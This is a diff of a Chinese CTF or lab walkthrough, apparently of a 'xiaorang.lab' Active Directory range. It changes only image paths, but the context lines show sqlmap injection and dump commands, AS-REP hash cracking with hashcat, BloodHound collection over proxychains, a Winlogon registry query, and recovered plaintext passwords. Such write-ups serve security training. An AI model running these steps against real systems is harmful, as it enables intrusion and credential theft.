@@ -201,7 +201,7 @@ start vulscan
 python sqlmap.py -u http://172.22.6.38/index.php --forms --batch --output-dir=reports/
 ```
 
-![](446c0038-9023-4d32-b84f-2dd6ac72260b.png)
+![](../assets/446c0038-9023-4d32-b84f-2dd6ac72260b.png)
 
 发现存在联合注入和盲注，进行注入。
 
@@ -211,11 +211,11 @@ python sqlmap.py -u http://172.22.6.38/index.php -D "oa_db" --tables --forms --b
 python sqlmap.py -u http://172.22.6.38/index.php -D "oa_db" -T "oa_f1Agggg" --dump --forms --batch --output-dir=reports/
 ```
 
-![](748632d8-1ba9-4f9a-8feb-2dbb7c15fbe1.png)
+![](../assets/748632d8-1ba9-4f9a-8feb-2dbb7c15fbe1.png)
 
 我们成功拿到第二个 flag。
 
-![](842a4a51-4783-42f7-9de2-15f79e8c1baa.png)
+![](../assets/842a4a51-4783-42f7-9de2-15f79e8c1baa.png)
 
 ## flag 3
 
@@ -638,7 +638,7 @@ $krb5asrep$23$zhangxin@XIAORANG.LAB:6b832e6374e02cea372036b52a858b5d$6d7892a3cfe
 hashcat hashs.txt /usr/share/wordlists/rockyou.txt --show
 ```
 
-![](892bde5f-ac4c-40f0-96ac-27d8fcd5f490.png)
+![](../assets/892bde5f-ac4c-40f0-96ac-27d8fcd5f490.png)
 
 ```bash
 hashcat -a 0 -m 18200 hashs.txt /usr/share/wordlists/rockyou.txt
@@ -673,9 +673,9 @@ proxychains4 bloodhound-python -c all -u zhangxin -p strawberry -d xiaorang.lab 
 > [!tips]
 > SIDHistory 是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的 SID 作为该对象的 objectSid，在之前域中的 SID 会添加到该对象的 SIDHistory 属性中，此时该对象将保留在原来域的 SID 对应的访问权限
 
-![](e4a2123d-61e4-4427-b30d-c76152c8f3ed.png)
+![](../assets/e4a2123d-61e4-4427-b30d-c76152c8f3ed.png)
 
-![](44c96870-6d2d-4ae9-b50d-8c4f8f54893b.png)
+![](../assets/44c96870-6d2d-4ae9-b50d-8c4f8f54893b.png)
 
 我们尝试去获取这个用户的 hash 值登录，但是因为权限不够，无法导出 hash。
 
@@ -703,7 +703,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 
 结果如下。
 
-![](c760e3b7-2ded-4a2a-bc33-fb8f1168af76.png)
+![](../assets/c760e3b7-2ded-4a2a-bc33-fb8f1168af76.png)
 
 我们直接可以得到 `YUXUAN@XIAORANG.LAB` 登录的账户密码是 `xiaorang.lab\yuxuan:Yuxuan7QbrgZ3L`。
 
